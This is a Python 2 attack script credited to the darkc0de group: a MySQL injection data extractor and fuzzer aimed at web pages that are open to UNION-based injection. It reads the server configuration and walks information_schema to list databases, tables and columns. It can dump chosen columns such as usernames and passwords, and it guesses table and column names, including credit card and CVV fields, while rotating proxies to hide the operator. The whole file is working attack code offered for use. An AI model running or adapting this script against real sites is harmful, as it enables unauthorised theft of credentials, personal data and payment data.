#!/usr/bin/python 
# MySQL Injection DataExt & Fuzzer

# This hopefully will extract all columns,tables,databases
# and put it in a nice reader friendly output

# based on work done by d3hydr8 from www.darkc0de.com - dataext.py
# respect where respect is due

# Share the Knowledge!

# Darkc0de Team 
# www.darkc0de.com 
# rsauron[at]gmail[dot]com

# Greetz to 
# d3hydr8, P47r1ck, Tarsian, c0mr@d, reverenddigitalx

# NOTES: 
# Proxy function may be a little buggy if your using public proxies... Test your proxy prior to using it with this script..
# The script does do a little proxy test.. it does a GET to google.com if data comes back its good... no data = failed and the proxy 
# will not be used. This is a effort to keep the script from getting stuck in a endless loop.
# If the fuzzing part starts returning results for every column and table... that usually means the error is not defined in the ERRORS
# variable. Manually visit the page get the error and add it to the variable.. I am not going to explain this. 
# Any other questions Hit the forums and ask questions. google is your friend!

#Fill in the error or errors your receiving here.
TABLE_ERRORS = ["Warning: mysql_free_result()","Warning: mysql_fetch_row()","You have an error in your SQL syntax","doesn't exist","SELECT command denied","Access denied","Warning: mysql_fetch_array()"]
COLUMN_ERRORS = ["Warning: mysql_fetch_row()","You have an error in your SQL syntax","doesn't exist","SELECT command denied","Unknown column"]

#Fill in the tables you want tested here.
fuzz_tables = ["orders","user","users","username","usernames","mysql.user","member","members","admin","administrator","administrators","login","logins","logon","jos_users","jos_contact_details","userrights","superuser","control","usercontrol","author","autore","artikel","newsletter","tb_user","tb_users","tb_username","tb_usernames","tb_admin","tb_administrator","tb_member","tb_members","tb_login","perdorues","korisnici","webadmin","webadmins","webuser","webusers","webmaster","webmasters","customer","customers","sysuser","sysusers","sysadmin","sysadmins","memberlist","tbluser","tbl_user","tbl_users","a_admin","x_admin","m_admin","adminuser","admin_user","adm","userinfo","user_info","admin_userinfo","userlist","user_list","user_admin","order","user_login","admin_user","admin_login","login_user","login_users","login_admin","login_admins","sitelogin","site_login","sitelogins","site_logins","SiteLogin","Site_Login","User","Users","Admin","Admins","Login","Logins","adminrights","news","perdoruesit"] 
#Fill in the columns you want tested here.
fuzz_columns = ["user","username","password","passwd","pass","cc_number","id","email","emri","fjalekalimi","pwd","user_name","customers_email_address","customers_password","user_password","name","user_pass","admin_user","admin_password","user_pass","admin_pass","usern","user_n","users","login","logins","login_user","login_admin","login_username","user_username","user_login","auid","apwd","adminid","admin_id","adminuser","admin_user","adminuserid","admin_userid","adminusername","admin_username","adminname","admin_name","usr","usr_n","usrname","usr_name","usrpass","usr_pass","usrnam","nc","uid","userid","user_id","myusername","mail","emni","logohu","punonjes","kpro_user","wp_users","emniplote","perdoruesi","perdorimi","punetoret","logini","llogaria","fjalekalimin","kodi","emer","ime","korisnik","korisnici","user1","administrator","administrator_name","mem_login","login_password","login_pass","login_passwd","login_pwd","sifra","lozinka","psw","pass1word","pass_word","passw","pass_w","user_passwd","userpass","userpassword","userpwd","user_pwd","useradmin","user_admin","mypassword","passwrd","admin_pwd","admin_pass","admin_passwd","mem_password","memlogin","userid","admin_id","adminid","e_mail","usrn","u_name","uname","mempassword","mem_pass","mem_passwd","mem_pwd","p_word","pword","p_assword","myusername","myname","my_username","my_name","my_password","my_email","cvvnumber"] 
  
import urllib, sys, re, socket, httplib, urllib2
			
print "\n\t\t\t   rsauron:darkc0de.com MySQL Injection DataExt & Fuzzer v3.0" 
print "\t\t\t-----------------------------------------------------------------"

#Validate input parameters
if len(sys.argv) < 3: 
	print "\n   Usage: ./schemaext.py -<f,u,s,e> <site> -o <output file> -p <proxy> -d <database> -t <table> -c <column,column>"
	print "\tModes: Required - but does not affect MySQL v4 servers... just fuzzing is done"
	print "\tDefine: -f extracts all database info."
	print "\tDefine: -u extracts just the current users database info."
	print "\tDefine: -s Show all databases the user has access to."
	print "\tDefine: -e Collect data from a table and column. requires -d -t -c."
	print "\n\tArgs: Optional"
	print "\tDefine: -d name of database you wish to extract info from - Only works in -f & -v mode"
	print "\tDefine: -t name of table you wish to extract info from."
	print "\tDefine: -c name of column you wish to extract data from. user,pass.. Only works in -v mode"
	print "\tDefine: -p proxy flag can be a proxy list or a single proxy"
	print "\tDefine: -o name of file to write output"
	print "\n   Ex: ./schemaext.py -u www.site.com/news.php?id=-1+union+select+1,darkc0de,3,4 -o output.txt -p 127.0.0.1:8080"
	print "   Ex: ./schemaext.py -f www.site.com/news.php?id=-1+union+select+1,darkc0de,3,4 -d catalog -t orders"
	print "   Ex: ./schemaext.py -u www.site.com/news.php?id=-1+union+select+1,darkc0de,3,4 -t jos_users -p proxies.txt"
	print "   Ex: ./schemaext.py -s www.site.com/news.php?id=-1+union+select+1,darkc0de,3,4 -o site.txt"
	print "   Ex: ./schemaext.py -e www.site.com/news.php?id=-1+union+select+1,darkc0de,3,4 -d catalog -t admins -c user,pass"
	sys.exit(1) 

site = ""
dbt = "database.txt"
proxy = "None"
count = 0
arg_table = "None"
arg_database = "None"
arg_columns = "None"
darkc0de = "concat(0x1e,0x1e,"

#Check args
for arg in sys.argv:
	if arg == "-f" or arg == "-u" or arg == "-s" or arg == "-e":
		mode = arg
		site = sys.argv[count+1]
	elif arg == "-o":
		dbt = sys.argv[count+1]
	elif arg == "-p":
		proxy = sys.argv[count+1]
	elif arg == "-t":
		arg_table = sys.argv[count+1]
	elif arg == "-d":
		arg_database = sys.argv[count+1]
	elif arg == "-s":
		arg_show = sys.argv[count+1]
	elif arg == "-c":
		arg_columns = sys.argv[count+1]
	count+=1

if arg_columns != "None":
	arg_columns = arg_columns.split(",")
if proxy != "None":
	if len(proxy.split(".")) == 2:
		proxy = open(proxy, "r").read()
	if proxy.endswith("\n"):
		proxy = proxy.rstrip("\n")
	proxy = proxy.split("\n")
if site == "":
	print "\n[-] Must include -f,-u,-s or -e flag followed by site.\n" 
	sys.exit(1)
if arg_table != "None" and arg_database == "None" and mode == "-f":
	print "\n[-] Must include -d flag when -t is specified in full mode.\n" 
	sys.exit(1)
if arg_columns != "None" and arg_database == "None" or arg_table == "None" and mode == "-e":
	print "\n[-] Must include -d flag and -t flag when mode -e is used"
	sys.exit(1)
if site.find("darkc0de") == -1: 
	print "\n[-] Site must follow -f,-u,-s or -e flag and contain \'darkc0de\'\n" 
	sys.exit(1) 
if site[:7] != "http://": 
	site = "http://"+site 
if site.endswith("/*"):
	site = site.rstrip('/*')

#Title write
print "\n[+] URL:",site
file = open(dbt, "a")
file.writelines("\n\n\t   rsauron:darkc0de.com MySQL Injection DataExt & Fuzzer v3.0")
file.writelines("\n\t-----------------------------------------------------------------")
file.writelines("\n[+] URL:"+site+"\n")	

#Build proxy list
socket.setdefaulttimeout(7)
proxy_list = []
if proxy != "None":
	file.writelines("[+] Building Proxy List...")
	print "[+] Building Proxy List..."
	for p in proxy:
		try:
			proxy_handler = urllib2.ProxyHandler({'http': 'http://'+p+'/'})
			opener = urllib2.build_opener(proxy_handler)
			opener.open("http://www.google.com")
			proxy_list.append(urllib2.build_opener(proxy_handler))
			file.writelines("\n\tProxy:"+p+"- Success")
			print "\tProxy:",p,"- Success"
		except:
			file.writelines("\tProxy:"+p+"- Failed")
			print "\tProxy:",p,"- Failed"
			pass
	if len(proxy_list) == 0:
		print "[-] All proxies have failed. App Exiting"
		sys.exit(1) 
	print "[+] Proxy List Complete"
	file.writelines("[+] Proxy List Complete")
else:
	print "[-] Proxy Not Given"
	file.writelines("[+] Proxy Not Given")
	proxy_list.append(urllib2.build_opener())

#Retireve version:user:database
head_URL = site.replace("darkc0de","concat(0x1e,0x1e,version(),0x1e,user(),0x1e,database(),0x1e,0x20)")+"/*"
print "[+] Gathering MySQL Server Configuration..."
proxy_num = 0
proxy_len = len(proxy_list)
while 1:
	try:
		source = proxy_list[proxy_num % proxy_len].open(head_URL).read()
# Uncomment the following lines to debug issues with gathering server information
#		print head_URL
#		print source
		match = re.findall("\x1e\x1e\S+",source)
		if len(match) >= 1:
			match = match[0][2:].split("\x1e")
			version = match[0]
			user = match[1]
			database = match[2]
			print "\tDatabase:", database
			print "\tUser:", user
			print "\tVersion:", version
			file.writelines("\n[+] Gathering MySQL Server Configuration...\n")
			file.writelines("\tDatabase: "+database+"\n")	
			file.writelines("\tUser: "+user+"\n")
			file.writelines("\tVersion: "+version)
			break
		else:
			print "[-] No Data Found"
			sys.exit(1)
	except (KeyboardInterrupt, SystemExit):
        	raise
	except:
		proxy_num+=1

#Validate version
if int(version[0]) >= 5:

	#Define Modes
	line_URL = "" 
	if mode == "-f":
		line_URL = site.replace("darkc0de","concat(0x1e,0x1e,table_schema,0x1e,table_name,0x1e,column_name,0x1e,0x20)") 	
		print "[+] Starting full database extraction...\n"
		file.writelines("\n[+] Starting full database extraction...\n")	
		line_URL += "+from+information_schema.columns+where"
		if arg_database != "None":
			line_URL += "+table_schema+=+0x"+arg_database.encode("hex")
			if arg_table != "None":
				line_URL += "+and+table_name+=+0x"+arg_table.encode("hex")
		else:
			line_URL += "+table_schema+!=+0x"+"information_schema".encode("hex")
	elif mode == "-u":
		line_URL = site.replace("darkc0de","concat(0x1e,0x1e,table_schema,0x1e,table_name,0x1e,column_name,0x1e,0x20)") 	
		print "[+] Starting current users database extraction...\n"
		file.writelines("\n[+] Starting current users database extraction...\n")
		line_URL += "+from+information_schema.columns+where+table_schema=database()"
		if arg_table != "None":
			line_URL += "+and+table_name+=+0x"+arg_table.encode("hex")
	elif mode == "-s":
		line_URL = site.replace("darkc0de","concat(0x1e,0x1e,schema_name,0x1e,0x20)")
		print "[+] Showing all databases user has access to...\n"
		file.writelines("\n[+] Showing all databases user has access to...\n")
		line_URL += "+from+information_schema.schemata+where+schema_name+!=+0x"+"information_schema".encode("hex")
	elif mode == "-e":
		for column in arg_columns:
			darkc0de += column+",0x1e,"
		line_URL = site.replace("darkc0de",darkc0de+"0x20)")
		line_URL += "+from+"+arg_database+"."+arg_table
		print "[+] Extracting information from",arg_table,"table...\n"
		file.writelines("\n[+] Extracting information from "+arg_table+" table...\n")
	line_URL += "+limit+NUM,1/*"

	cur_db = ""
	cur_table = ""
	table_num = 0
	terminal = ""
	num = 0

	#Loop for gathering info from databases,tables,columns
	while 1:
		try:
			proxy_num+=1
			source = proxy_list[proxy_num % proxy_len].open(line_URL.replace("NUM",str(num))).read() 
			match = re.findall("\x1e\x1e\S+",source)
			if len(match) >= 1:
				if mode == "-u" or mode == "-f":
					match = match[0][2:].split("\x1e")
					if cur_db != match[0]:
						if terminal != "":
							print terminal,"\n"
							terminal = ""				
						cur_db = match[0]
						file.writelines("\n[Database]: "+match[0]+"\n")
						print "[Database]: "+match[0]+"\n"
						table_num = 0	
						print "[Table: Columns]"
						file.writelines("\n[Table: Columns]")
					if cur_table != match[1]:
						if terminal != "":
							print terminal
						cur_table = match[1]
						file.writelines("\n["+str(table_num)+"]"+match[1]+": "+match[2])
						terminal = "["+str(table_num)+"]"+match[1]+": "+match[2]
						table_num+=1
					else:
						file.writelines(","+match[2])
						terminal += ","+match[2]
				#Gathering Databases only
                   		elif mode == "-s":
                        		match = match[0]
                        		file.writelines("\n["+str(num)+"]"+str(match))
                       			print "["+str(num)+"]",match
				#Collect data from tables & columns
				elif mode == "-e":
					match = match[0].strip("\x1e").split("\x1e")
					file.writelines("\n["+str(num)+"]"+str(match))
					print "["+str(num)+"]",match
			else:
				if num == 0:
					print "\n[-] No Data Found"
			#Uncomment the following line for proxy debugging 
			#	print source
				break
			num+=1
		except (KeyboardInterrupt, SystemExit):
			raise
		except:
		#Uncomment the following line for proxy debugging 
		#	print (proxy_num % proxy_len), sys.exc_info()	
			pass	
	if terminal != "":
			print terminal
else:
	#Fuzz table/columns
	print "[+] Fuzzing Tables..."
	file.writelines("\n[+] Fuzzing Tables...")
	fuzz_URL = site+"+from+TABLE+/*"
	for table in fuzz_tables: 
		try:
			proxy_num+=1
			table_URL = fuzz_URL.replace("TABLE",table)
			source = proxy_list[proxy_num % proxy_len].open(table_URL).read()
			e = [error for error in TABLE_ERRORS if re.search(error, source)]
			if len(e) == 0:
				print "\n[Table]:",table
				file.writelines("\n\n[Table]:"+table)
				for column in fuzz_columns:
					try:
						proxy_num+=1
						source = proxy_list[proxy_num % proxy_len].open(table_URL.replace("darkc0de", column)).read()
					# Uncomment the line below to debug issues with the fuzzer
					#	print source
						e = [error for error in COLUMN_ERRORS if re.search(error, source)]
						if len(e) == 0:
							print "[Column]:",column
							file.writelines("\n[Column]:"+column)	
					except (KeyboardInterrupt, SystemExit):
						raise
					except:
						pass	
		except (KeyboardInterrupt, SystemExit):
			raise
		except:
			pass

print "\n[-] Done"
file.writelines("\n\n[-] Done\n")
print "Don't forget to check", dbt,"\n"
file.close()
